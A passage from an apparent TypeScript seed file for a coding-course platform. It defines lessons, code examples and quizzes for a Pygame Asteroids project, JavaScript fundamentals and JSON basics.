      `Time to combine models, Motor, and path operations into a real API.\n\n## Requirements\n\n1. Define a Pydantic \`Task\` model with at least a title, a completed flag, and one more field of your choice.\n2. Connect to a MongoDB database (local, Docker, or a free Atlas cluster) using Motor.\n3. Build full CRUD endpoints, \`POST /tasks\`, \`GET /tasks\`, \`GET /tasks/{id}\`, \`PUT /tasks/{id}\`, and \`DELETE /tasks/{id}\`.\n4. Return a proper \`404\` when a requested task doesn't exist.\n5. Confirm your endpoints work using the automatic docs at \`/docs\`.\n\n## Stretch goals\n\n- Add a query parameter to filter tasks by \`done\` status.\n- Add pagination with \`skip\`/\`limit\` query parameters.\n- Add a second collection (e.g. \`users\` or \`projects\`) with a relationship to tasks.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const pygameAsteroidsLessons: SeedLesson[] = [
  {
    title: 'Pygame: Setup and Installation',
    content: lessonContent(
      'Pygame: Setup and Installation',
      `Pygame is a popular Python library for building 2D games, handling graphics, sound, input, and timing so you don't have to write that from scratch. In this project, you'll build a clone of the classic arcade game **Asteroids**: a ship that rotates and thrusts through space, dodging (and eventually destroying) asteroids drifting across the screen.\n\n## Installing Pygame\n\nPygame doesn't run inside this course's browser sandbox (it needs a real window to draw into), so for this project you'll write and run code locally with a real Python install.\n\n\`\`\`bash\npip install pygame\n\`\`\`\n\nVerify it installed correctly:\n\n\`\`\`\nimport pygame\nprint(pygame.ver)\n\`\`\`\n\n## Opening a window\n\nEvery Pygame program starts the same way: initialize the library, create a window (called a **surface**), and give it a title.\n\n\`\`\`\nimport pygame\n\npygame.init()\n\nWIDTH, HEIGHT = 800, 600\nscreen = pygame.display.set_mode((WIDTH, HEIGHT))\npygame.display.set_caption("Asteroids")\n\`\`\`\n\n- \`pygame.init()\` sets up every Pygame subsystem (display, sound, input) in one call.\n- \`pygame.display.set_mode((width, height))\` creates the actual window and returns a \`Surface\` you'll draw everything onto.\n- Nothing shows up yet, and the window will look "frozen"/unresponsive, that's because there's no loop keeping it open and processing events, which is exactly what the next lesson builds.\n\n> [!NOTE]\n> Running this script as-is will open a window and then immediately close it (or hang, depending on your OS), that's expected. A real window needs a **game loop** to stay open and respond to events, covered next.`
    ),
    quiz: {
      title: 'Pygame Setup Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function creates the actual game window in Pygame?',
          options: ['pygame.init()', 'pygame.display.set_mode()', 'pygame.window.create()', 'pygame.new_screen()'],
          answer: 'pygame.display.set_mode()',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'pygame.init() must be called before using most other Pygame features.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'pygame.display.set_mode() returns a ____ that you draw everything onto.',
          options: [],
          answer: 'surface',
        },
      ],
    },
  },
  {
    title: 'The Game Loop',
    content: lessonContent(
      'The Game Loop',
      `Every real-time game (not just Asteroids) is built around one core idea: the **game loop**, an endless cycle that processes input, updates state, and draws the next frame, over and over, many times per second.\n\n## The three phases\n\n\`\`\`\nimport pygame\n\npygame.init()\nscreen = pygame.display.set_mode((800, 600))\nclock = pygame.time.Clock()\n\nrunning = True\nwhile running:\n    # 1. Handle input/events\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    # 2. Update game state\n    # (nothing to update yet)\n\n    # 3. Draw the frame\n    screen.fill((10, 10, 30))  # dark space background\n    pygame.display.flip()\n\n    clock.tick(60)  # cap the loop at 60 frames per second\n\npygame.quit()\n\`\`\`\n\n- **Handle events**: \`pygame.event.get()\` drains the queue of everything that happened since the last frame (key presses, window close, etc). Without checking for \`pygame.QUIT\`, clicking the window's close button would do nothing.\n- **Update**: where you'll move the player, move asteroids, check collisions, this lesson's loop doesn't update anything yet, but the slot is there.\n- **Draw**: \`screen.fill(...)\` clears the previous frame to a solid color, then \`pygame.display.flip()\` actually shows everything you've drawn since the last flip, nothing is visible on screen until you call it.\n\n## Why clock.tick(60)?\n\n\`\`\`\nclock = pygame.time.Clock()\n# ... inside the loop:\nclock.tick(60)\n\`\`\`\n\n\`clock.tick(60)\` pauses just long enough to cap the loop at 60 iterations per second. Without it, the loop would run as fast as the CPU allows, hundreds or thousands of times per second, burning a full CPU core and making movement speed depend on how fast the computer happens to be. Capping the frame rate keeps the game's speed consistent across different machines.\n\n> [!WARNING]\n> Forgetting to call \`pygame.event.get()\` at all (not just skipping the QUIT check) makes the OS think the program has hung, since it isn't responding. Always drain the event queue every frame, even if you don't care about most of the events in it.`
    ),
    quiz: {
      title: 'Game Loop Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does clock.tick(60) do?',
          options: [
            'Draws 60 asteroids',
            'Caps the loop at 60 iterations per second',
            'Waits 60 seconds before starting',
            "Counts the player's score",
          ],
          answer: 'Caps the loop at 60 iterations per second',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'pygame.display.flip() must be called for anything drawn that frame to actually appear on screen.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____.event.get() drains the queue of input/window events since the last frame.',
          options: [],
          answer: 'pygame',
        },
      ],
    },
  },
  {
    title: 'The Player Class',
    content: lessonContent(
      'The Player Class',
      `With the loop running, it's time to put something on screen: the player's ship. This is also where **object-oriented programming** starts paying off, every asteroid and bullet you add later will follow the same pattern as this \`Player\` class.\n\n## Defining the class\n\n\`\`\`\nimport math\nimport pygame\n\nclass Player:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n        self.angle = 0          # degrees, 0 = facing up\n        self.speed = 0\n        self.radius = 15\n\n    def rotate(self, direction):\n        self.angle += direction * 4  # degrees per frame\n\n    def thrust(self):\n        self.speed = min(self.speed + 0.15, 6)  # accelerate, capped at a max speed\n\n    def update(self):\n        radians = math.radians(self.angle)\n        self.x += -math.sin(radians) * self.speed\n        self.y += math.cos(radians) * self.speed\n        self.speed *= 0.99  # gentle drag, so the ship coasts to a stop instead of forever\n\n    def draw(self, screen):\n        radians = math.radians(self.angle)\n        tip = (self.x + math.sin(radians) * self.radius, self.y - math.cos(radians) * self.radius)\n        left = (self.x - math.cos(radians) * self.radius * 0.6, self.y - math.sin(radians) * self.radius * 0.6)\n        right = (self.x + math.cos(radians) * self.radius * 0.6, self.y + math.sin(radians) * self.radius * 0.6)\n        pygame.draw.polygon(screen, (255, 255, 255), [tip, left, right])\n\`\`\`\n\n- \`__init__\` stores the ship's position (\`x\`, \`y\`), facing \`angle\`, current \`speed\`, and a \`radius\` you'll reuse for collision checks later.\n- \`rotate\` and \`thrust\` don't move the ship directly, they just change its angle/speed, \`update\` is what actually applies that to the position every frame, using basic trigonometry to convert an angle into an x/y direction.\n- \`draw\` computes three points (nose and two rear corners) from the ship's angle and position, then hands them to \`pygame.draw.polygon\` to render a simple triangle ship, classic Asteroids style.\n\n## Wiring it into the loop\n\n\`\`\`\nplayer = Player(400, 300)\n\nrunning = True\nwhile running:\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    keys = pygame.key.get_pressed()\n    if keys[pygame.K_LEFT]:\n        player.rotate(-1)\n    if keys[pygame.K_RIGHT]:\n        player.rotate(1)\n    if keys[pygame.K_UP]:\n        player.thrust()\n\n    player.update()\n\n    screen.fill((10, 10, 30))\n    player.draw(screen)\n    pygame.display.flip()\n    clock.tick(60)\n\`\`\`\n\n\`pygame.key.get_pressed()\` returns the state of *every* key as a list-like object, checking \`keys[pygame.K_LEFT]\` each frame (rather than only reacting to individual key-down events) is what gives you smooth, held-down rotation and thrust instead of one press = one tiny nudge.\n\n> [!TIP]\n> Notice \`rotate\`/\`thrust\` only change \`angle\`/\`speed\`, while \`update\` is the only method that touches \`x\`/\`y\`. Separating "what changed" from "apply the change" like this makes it much easier to add things like screen-wrap or drag later without touching your input-handling code.`
    ),
    quiz: {
      title: 'Player Class Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function lets you check every frame whether a key is currently held down?',
          options: ['pygame.event.get()', 'pygame.key.get_pressed()', 'pygame.key.was_pressed()', 'pygame.QUIT'],
          answer: 'pygame.key.get_pressed()',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "In the Player class, the rotate() and thrust() methods directly change the ship's x and y position.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'pygame.draw.____(screen, color, points) draws a shape from a list of (x, y) points, used here for the ship.',
          options: [],
          answer: 'polygon',
        },
      ],
    },
  },
  {
    title: 'Asteroids',
    content: lessonContent(
      'Asteroids',
      `A ship with nothing to dodge isn't much of a game. This lesson adds the asteroids themselves, and a screen-wrapping trick that both the ship and asteroids will share.\n\n## An Asteroid class\n\n\`\`\`\nimport random\nimport pygame\n\nclass Asteroid:\n    def __init__(self, x, y, size=40):\n        self.x = x\n        self.y = y\n        self.size = size\n        self.dx = random.uniform(-2, 2)\n        self.dy = random.uniform(-2, 2)\n\n    def update(self, width, height):\n        self.x = (self.x + self.dx) % width   # wrap around the left/right edges\n        self.y = (self.y + self.dy) % height  # wrap around the top/bottom edges\n\n    def draw(self, screen):\n        pygame.draw.circle(screen, (160, 160, 160), (int(self.x), int(self.y)), self.size, width=2)\n\`\`\`\n\n\`self.x % width\` is the key trick: Python's modulo operator wraps a value that goes past \`width\` back around to \`0\`, and a negative value back around to just under \`width\`. Applying it to both \`x\` and \`y\` every frame gives you the classic Asteroids screen-wrap for free, drift off the right edge, and you reappear on the left.\n\n## Spawning a field of them\n\n\`\`\`\ndef spawn_asteroids(count, width, height):\n    asteroids = []\n    for _ in range(count):\n        x = random.uniform(0, width)\n        y = random.uniform(0, height)\n        asteroids.append(Asteroid(x, y))\n    return asteroids\n\nasteroids = spawn_asteroids(5, 800, 600)\n\`\`\`\n\n## Updating and drawing all of them\n\n\`\`\`\nrunning = True\nwhile running:\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    # ... player input handling from the previous lesson ...\n    player.update()\n\n    for asteroid in asteroids:\n        asteroid.update(800, 600)\n\n    screen.fill((10, 10, 30))\n    player.draw(screen)\n    for asteroid in asteroids:\n        asteroid.draw(screen)\n    pygame.display.flip()\n    clock.tick(60)\n\`\`\`\n\nLooping over \`asteroids\` twice, once to \`update()\` and once to \`draw()\`, is deliberate: every asteroid's position should be fully updated *before* any of them are drawn, otherwise you'd occasionally draw a half-updated frame (some asteroids moved, some not yet), causing visible stutter.\n\n> [!NOTE]\n> Right now the ship can fly straight through an asteroid with nothing happening, that's intentional for this lesson. Collision detection comes in a later lesson, once there's also something (a bullet) to collide with.`
    ),
    quiz: {
      title: 'Asteroids Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does self.x % width accomplish in Asteroid.update?',
          options: [
            'Slows the asteroid down over time',
            'Wraps the position back on-screen when it goes past an edge',
            'Rotates the asteroid',
            'Deletes the asteroid',
          ],
          answer: 'Wraps the position back on-screen when it goes past an edge',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "The example loop updates every asteroid's position before drawing any of them, rather than updating and drawing one at a time.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'random.____(-2, 2) returns a random floating-point number between -2 and 2, used for each asteroid\'s drift speed.',
          options: [],
          answer: 'uniform',
        },
      ],
    },
  },
  {
    title: 'Shooting Bullets',
    content: lessonContent(
      'Shooting Bullets',
      `Dodging is only half of Asteroids, next you'll give the ship a way to fight back.\n\n## A Bullet class\n\n\`\`\`\nimport math\nimport pygame\n\nclass Bullet:\n    def __init__(self, x, y, angle):\n        self.x = x\n        self.y = y\n        radians = math.radians(angle)\n        self.dx = -math.sin(radians) * 10\n        self.dy = math.cos(radians) * -10\n        self.life = 60  # frames until it disappears, about 1 second at 60 FPS\n\n    def update(self):\n        self.x += self.dx\n        self.y += self.dy\n        self.life -= 1\n\n    def is_dead(self):\n        return self.life <= 0\n\n    def draw(self, screen):\n        pygame.draw.circle(screen, (255, 220, 100), (int(self.x), int(self.y)), 3)\n\`\`\`\n\nA bullet reuses the same angle-to-direction math as the ship's \`update\`, fired at a fixed speed (\`10\`) in whatever direction the ship was facing at the moment it fired. The \`life\` counter, decremented every frame, is what makes bullets disappear on their own instead of flying forever, \`is_dead()\` gives the rest of the code a clean way to ask "should this be removed yet?".\n\n## Firing on spacebar, with a cooldown\n\n\`\`\`\nbullets = []\ncooldown = 0\n\nrunning = True\nwhile running:\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    keys = pygame.key.get_pressed()\n    if keys[pygame.K_SPACE] and cooldown == 0:\n        bullets.append(Bullet(player.x, player.y, player.angle))\n        cooldown = 15  # frames before you can fire again\n\n    if cooldown > 0:\n        cooldown -= 1\n\n    for bullet in bullets:\n        bullet.update()\n    bullets = [b for b in bullets if not b.is_dead()]\n\n    # ... player and asteroid updates from earlier lessons ...\n\n    screen.fill((10, 10, 30))\n    for bullet in bullets:\n        bullet.draw(screen)\n    pygame.display.flip()\n    clock.tick(60)\n\`\`\`\n\nTwo details are doing the real work here:\n\n- **The cooldown counter** stops holding spacebar from firing a new bullet every single frame (60 a second!), a fixed delay between shots is what makes it feel like a weapon instead of a hose.\n- **The list comprehension** \`[b for b in bullets if not b.is_dead()]\` rebuilds the \`bullets\` list containing only the ones still alive, this is the standard Python idiom for "remove items matching a condition" from a list, since you can't safely remove items from a list while iterating over it directly.\n\n> [!TIP]\n> This same "append when spawned, filter out when dead" pattern is exactly how you'll manage destroyed asteroids in the next lesson too, it's worth getting comfortable with here first.`
    ),
    quiz: {
      title: 'Bullets Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does the bullet-firing code track a cooldown counter?',
          options: [
            'To make bullets fly faster',
            'To prevent firing a new bullet on every single frame while spacebar is held',
            "To count the player's score",
            'To slow down the asteroids',
          ],
          answer: 'To prevent firing a new bullet on every single frame while spacebar is held',
        },
        {
          type: 'TRUE_FALSE',
          prompt: '[b for b in bullets if not b.is_dead()] creates a new list containing only the bullets that are still alive.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "A bullet's ____ counter decreases by one every frame and determines when it disappears.",
          options: [],
          answer: 'life',
        },
      ],
    },
  },
  {
    title: 'Collisions, Score, and Game Over',
    content: lessonContent(
      'Collisions, Score, and Game Over',
      `With bullets and asteroids both on screen, it's time to make them actually interact: destroy asteroids you shoot, and end the game if one hits your ship.\n\n## Distance-based collision detection\n\n\`\`\`\nimport math\n\ndef distance(a, b):\n    return math.hypot(a.x - b.x, a.y - b.y)\n\`\`\`\n\nFor circular objects (ships, asteroids, bullets all drawn as circles/triangles with a \`radius\`), you don't need pixel-perfect collision, just check whether the distance between two centers is less than the sum of their radii:\n\n\`\`\`\ndef circles_collide(a, b):\n    return distance(a, b) < (a.radius + b.radius)\n\`\`\`\n\n## Bullets destroying asteroids\n\n\`\`\`\nscore = 0\n\nfor bullet in bullets:\n    for asteroid in asteroids:\n        if distance(bullet, asteroid) < asteroid.size:\n            bullet.life = 0        # mark the bullet dead so it gets filtered out\n            asteroid.hit = True    # mark this asteroid for removal\n            score += 100\n\nasteroids = [a for a in asteroids if not getattr(a, 'hit', False)]\nbullets = [b for b in bullets if not b.is_dead()]\n\`\`\`\n\nRather than removing items from \`asteroids\`/\`bullets\` in the middle of the nested loop (which corrupts the loop you're iterating over), the pattern is the same as the bullet-cleanup from the last lesson: mark things as "should be removed" first, then filter both lists once, after the collision checks are done.\n\n## Ending the game\n\n\`\`\`\ngame_over = False\n\nfor asteroid in asteroids:\n    if circles_collide(player, asteroid):\n        game_over = True\n\nif game_over:\n    font = pygame.font.SysFont(None, 64)\n    text = font.render("GAME OVER", True, (255, 60, 60))\n    screen.blit(text, (250, 260))\n\`\`\`\n\n\`pygame.font.SysFont(None, 64)\` loads the operating system's default font at size 64, \`.render(text, antialias, color)\` turns a string into a drawable \`Surface\`, and \`screen.blit(surface, position)\` is how you draw *any* image or rendered text onto the screen, it's the same function you'd use to draw a sprite image.\n\n> [!WARNING]\n> Once \`game_over\` is \`True\`, this snippet still keeps calling \`player.update()\`/\`asteroid.update()\` every frame unless you guard those calls too, remember to stop updating gameplay (but keep the event loop and drawing running) once the game has ended, otherwise the ship and asteroids keep moving invisibly under your "GAME OVER" text.`
    ),
    quiz: {
      title: 'Collisions & Game Over Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does screen.blit(surface, position) do?',
          options: [
            'Deletes a surface',
            'Draws one surface (an image or rendered text) onto another at a position',
            'Creates a new window',
            'Detects a collision',
          ],
          answer: 'Draws one surface (an image or rendered text) onto another at a position',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two circular objects are considered colliding when the distance between their centers is less than the sum of their radii.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'math.____(dx, dy) computes the straight-line distance between two points from their x and y differences.',
          options: [],
          answer: 'hypot',
        },
      ],
    },
  },
  {
    title: 'Final Project: Finish Your Asteroids Game',
    content: lessonContent(
      'Final Project: Finish Your Asteroids Game',
      `You now have every piece: a ship that rotates and thrusts, asteroids that drift and wrap around the screen, bullets with a cooldown, and collision detection that awards score and ends the game. Put it all together into a complete, playable game.\n\n## Requirements\n\n1. Combine the \`Player\`, \`Asteroid\`, and \`Bullet\` classes from earlier lessons into a single game with one game loop running at 60 FPS.\n2. Display the current score on screen every frame (reuse the \`pygame.font\`/\`screen.blit\` approach from the Collisions lesson).\n3. When an asteroid is destroyed by a bullet, split it into two smaller asteroids (half the \`size\`, each with a new random \`dx\`/\`dy\`) if it's above some minimum size, instead of just disappearing, this is the classic Asteroids "splitting" mechanic.\n4. Track a \`lives\` count (start at 3). When the player's ship collides with an asteroid, lose a life and respawn the ship at the center of the screen instead of ending immediately, only show "GAME OVER" once lives reach 0.\n5. Add a simple start screen ("Press SPACE to start") shown before the game loop begins updating gameplay.\n\n## Stretch goals\n\n- Make the ship briefly invulnerable (and visually flash) for a second after respawning, so it can't immediately lose another life to an asteroid it spawned on top of.\n- Add a basic sound effect for firing and for an asteroid being destroyed with \`pygame.mixer\`.\n- Increase difficulty over time by spawning additional asteroids the longer the player survives.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const jsLessons: SeedLesson[] = [
  {
    title: 'JavaScript in the Browser',
    content: lessonContent(
      'JavaScript in the Browser',
      `JavaScript is the one programming language that runs natively in every web browser, it's what makes pages interactive: reacting to clicks, fetching data, and updating content without a full page reload.\n\n## Your first JavaScript\n\n\`\`\`js\nconst name = 'Kodstigen';\nconsole.log('Hello, ' + name + '!');\n\nconst year = new Date().getFullYear();\nconsole.log('It is', year);\n\`\`\`\n\n## Declaring variables\n\n- \`const\` declares a variable that can't be reassigned after it's set, use it by default.\n- \`let\` declares a variable you *can* reassign later, use it when a value needs to change (like a counter).\n- \`var\` is the old way of declaring variables, from before \`let\`/\`const\` existed, you'll still see it in older code, but modern JavaScript avoids it.\n\n\`\`\`js\nlet xp = 0;\nxp = xp + 10; // fine, let can be reassigned\n\nconst name = 'Ada';\n// name = 'Grace'; ❌ this would throw an error, const can't be reassigned\n\`\`\`\n\n## The DOM\n\nIn a real page, JavaScript reads and modifies the **DOM** (Document Object Model), the live tree of elements your code can change:\n\n\`\`\`\nconst button = document.querySelector('#greet');\nbutton.addEventListener('click', () => {\n  document.querySelector('#out').textContent = 'Hello!';\n});\n\`\`\`\n\n*DOM code needs a real web page, so that block is read-only here, every other example in this course is runnable. Try the first one!*`
    ),
    quiz: {
      title: 'DOM Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does DOM stand for?',
          options: ['Data Object Model', 'Document Object Model', 'Digital Ordinance Map', 'Document Order Method'],
          answer: 'Document Object Model',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To react to a click you call element.____("click", handler).',
          options: [],
          answer: 'addEventListener',
        },
      ],
    },
  },
  {
    title: 'Arrays and Higher-Order Functions',
    content: lessonContent(
      'Arrays and Higher-Order Functions',
      `A **higher-order function** is simply a function that takes another function as an argument, or returns one. Arrays have several built-in higher-order functions that let you transform data without writing manual loops.\n\n\`\`\`js\nconst scores = [80, 92, 67, 100];\n\nconst passed = scores.filter(s => s >= 70);   // [80, 92, 100]\nconst doubled = scores.map(s => s * 2);\nconst total = scores.reduce((sum, s) => sum + s, 0);\n\nconsole.log('passed:', passed);\nconsole.log('doubled:', doubled);\nconsole.log('total:', total);\n\`\`\`\n\n## The three big ones\n\n- \`.filter(fn)\` builds a **new array** containing only the elements where \`fn\` returns \`true\`. Here, \`s => s >= 70\` keeps every score of 70 or above.\n- \`.map(fn)\` builds a **new array** by transforming every element. Here, \`s => s * 2\` doubles each score.\n- \`.reduce((acc, s) => ..., initialValue)\` combines every element into a single value. \`acc\` (the "accumulator") carries the running result forward from one element to the next, starting at \`initialValue\` (here, \`0\`).\n\n## Why not just use a for loop?\n\nYou could write the same logic with a \`for\` loop, but \`map\`/\`filter\`/\`reduce\` say *what* you want ("give me only the passing scores") instead of *how* to get it (looping, checking, pushing to a new array). None of them modify the original array, \`scores\` is untouched after all three calls, that predictability is a big part of why they're the backbone of modern JavaScript.`
    ),
    quiz: {
      title: 'Array Methods Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which method returns a new array with only the elements that pass a test?',
          options: ['map', 'filter', 'reduce', 'forEach'],
          answer: 'filter',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Array.prototype.map mutates the original array.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Promises and fetch',
    content: lessonContent(
      'Promises and fetch',
      `Some operations, like a network request, take time and don't finish immediately. A **Promise** represents a value that will exist *later*, either successfully (**resolved**) or with an error (**rejected**). \`async\`/\`await\` lets you write that asynchronous code so it reads top-to-bottom, like ordinary synchronous code.\n\n\`\`\`js\nfunction loadCourse(id) {\n  // simulate a slow network request\n  return new Promise((resolve) => {\n    setTimeout(() => resolve({ id, title: 'Modern JavaScript' }), 500);\n  });\n}\n\nconsole.log('loading…');\nconst course = await loadCourse(42);\nconsole.log('loaded:', course.title);\n\`\`\`\n\n## Reading it\n\n- \`new Promise((resolve) => { ... })\` creates a Promise that starts out **pending**. Calling \`resolve(value)\` (usually once some async work finishes) moves it to **resolved** with that value.\n- \`await\` pauses the surrounding \`async\` function until the Promise resolves, then hands you the resolved value directly, no \`.then()\` callback needed.\n- Notice the console logs "loading…" *before* "loaded: ...", \`await\` doesn't freeze the whole page, it just pauses this function while other things could still happen.\n\n## fetch\n\nWith a real API you'd use \`fetch\` exactly the same way, it returns a Promise too:\n\n\`\`\`\nconst res = await fetch('/api/courses');\nif (!res.ok) throw new Error('Request failed');\nconst courses = await res.json();\n\`\`\`\n\n\`res.json()\` is itself asynchronous (parsing the response body takes a moment), so it needs its own \`await\` too.`
    ),
    quiz: {
      title: 'Async Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'Inside an async function you pause for a Promise with the ____ keyword.',
          options: [],
          answer: 'await',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does fetch() return?',
          options: ['A string', 'A Promise', 'A JSON object directly', 'An XMLHttpRequest'],
          answer: 'A Promise',
        },
      ],
    },
  },
  {
    title: 'Objects and Destructuring',
    content: lessonContent(
      'Objects and Destructuring',
      `Objects group related data together. **Destructuring** and the **spread operator** make working with them much less repetitive.\n\n\`\`\`js\nconst course = { title: 'Modern JavaScript Essentials', lessons: 6, published: true };\n\nconst { title, lessons } = course;\nconsole.log(title, lessons);\n\nconst student = { name: 'Ada', scores: [88, 92, 79] };\nconst { name, scores: [first, ...rest] } = student;\nconsole.log(name, first, rest);\n\nconst upgraded = { ...course, lessons: course.lessons + 1 };\nconsole.log(upgraded);\nconsole.log('original untouched:', course.lessons);\n\`\`\`\n\n## What's happening\n\n- \`const { title, lessons } = course\` pulls properties straight out of an object into variables.\n- \`...rest\` collects whatever is left over into a new array (or object).\n- \`{ ...course, lessons: 7 }\` **copies** every property from \`course\` into a brand-new object, then overrides \`lessons\`, the original object is never mutated.`
    ),
    quiz: {
      title: 'Objects & Destructuring Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the spread operator do when used inside a new object literal, e.g. `{ ...course }`?',
          options: [
            'Deletes the original object',
            'Copies the properties of course into the new object',
            'Converts course to a string',
            'Freezes the original object',
          ],
          answer: 'Copies the properties of course into the new object',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'const { title } = course; is an example of object ____.',
          options: [],
          answer: 'destructuring',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Writing `{ ...course, lessons: 7 }` mutates the original course object.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Events and the DOM',
    content: lessonContent(
      'Events and the DOM',
      `Beyond reading the DOM, real pages react to what the user does, clicks, typing, submitting forms, through **events**.\n\n\`\`\`\nconst button = document.querySelector('#save');\nbutton.addEventListener('click', (event) => {\n  event.preventDefault();\n  console.log('Saved!');\n});\n\nconst input = document.querySelector('#name');\ninput.addEventListener('input', (event) => {\n  console.log('Typing:', event.target.value);\n});\n\`\`\`\n\n*This needs a real web page with a #save button and #name input, so it's read-only here, you'll wire up real event handlers in the final project.*\n\n## Key ideas\n\n- \`addEventListener(type, handler)\` attaches a handler for an event type (\`'click'\`, \`'input'\`, \`'submit'\`, and many more) without overwriting any handlers already attached.\n- The \`event\` object passed to your handler describes what happened, \`event.target\` is the element the event fired on, \`event.target.value\` reads an input's current text.\n- \`event.preventDefault()\` stops the browser's default behavior, most commonly used to stop a form from reloading the page on submit.`
    ),
    quiz: {
      title: 'Events Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which method attaches an event handler to an element?',
          options: ['element.onEvent()', 'element.addEventListener()', 'element.handle()', 'element.listen()'],
          answer: 'element.addEventListener()',
        },
        {
          type: 'FILL_BLANK',
          prompt: "Calling event.____() stops a form's default submit behavior.",
          options: [],
          answer: 'preventDefault',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An element can have more than one event listener attached to it at the same time.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Interactive To-Do List',
    content: lessonContent(
      'Final Project: Interactive To-Do List',
      `Time to combine array methods, objects, and DOM events into a real interactive page.\n\n## Requirements\n\n1. Render a list of tasks from an array of objects, e.g. \`{ id, text, done }\`.\n2. Let the user add a new task through an input and button (or a form submit).\n3. Let the user toggle a task's done state and remove a task.\n4. Use \`map\`/\`filter\` to derive what gets rendered rather than mutating the DOM by hand everywhere.\n5. Persist the task list in \`localStorage\` so it survives a page reload.\n\n## Stretch goals\n\n- Add filter buttons for All / Active / Completed.\n- Allow editing a task's text inline.\n- Show a live count of remaining tasks.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const jsonDomLessons: SeedLesson[] = [
  {
    title: 'What is JSON?',
    content: lessonContent(
      'What is JSON?',
      `JSON (JavaScript Object Notation) is a lightweight, text-based format for representing structured data. It's how APIs send data over a network, how config files get written, and how you persist data to disk or \`localStorage\`.\n\n## Valid JSON values\n\nJSON supports exactly six types: string, number, boolean, null, object, and array. Notably absent: \`undefined\`, functions, and comments, none of those exist in JSON.\n\n\`\`\`js\nconst config = {\n  name: 'Kodstigen',\n  version: 2,\n  isPublic: true,\n  maintainer: null,\n  tags: ['learning', 'javascript'],\n};\nconsole.log(JSON.stringify(config));\n\`\`\`\n\n## JSON vs a JavaScript object literal\n\nThey look almost identical, but JSON is a *text format*: keys and string values must use double quotes, and it can't contain functions, \`undefined\`, \`Date\` objects, or comments. A JavaScript object literal has none of those restrictions, it's just code.\n\n\`\`\`js\n// Valid JSON text (a string):\nconst jsonText = '{"name":"Ada","active":true}';\n\n// A JS object literal (code, not a string):\nconst obj = { name: 'Ada', active: true };\n\`\`\``
    ),
    quiz: {
      title: 'JSON Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these is NOT a valid JSON value type?',
          options: ['string', 'boolean', 'undefined', 'null'],
          answer: 'undefined',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'JSON object keys must be wrapped in double quotes.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'JSON stands for JavaScript Object ____.',
          options: [],
          answer: 'Notation',
        },
      ],
    },
  },
  {
    title: 'Parsing and Stringifying JSON',
    content: lessonContent(
      'Parsing and Stringifying JSON',
